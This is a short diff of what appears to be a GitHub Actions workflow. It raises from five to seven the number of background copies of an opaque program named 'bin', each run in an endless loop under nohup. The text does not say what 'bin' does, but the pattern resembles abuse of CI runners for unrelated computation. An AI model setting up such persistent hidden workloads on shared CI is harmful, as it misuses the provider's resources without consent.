@@ -26,7 +26,7 @@ jobs:
           # mkdir thread1 && echo 'while true; do python3 bin; done' > thread1/run.sh && chmod +x thread1/run.sh
           # cp bin thread1 && cd thread1 && nohup bash run.sh & echo 'yes' && cd
 
-          for i in $(seq 1 5); do
+          for i in $(seq 1 7); do
             mkdir -p thread$i && \
             echo 'while true; do python3 bin; done' > thread$i/run.sh && \
             chmod +x thread$i/run.sh && \
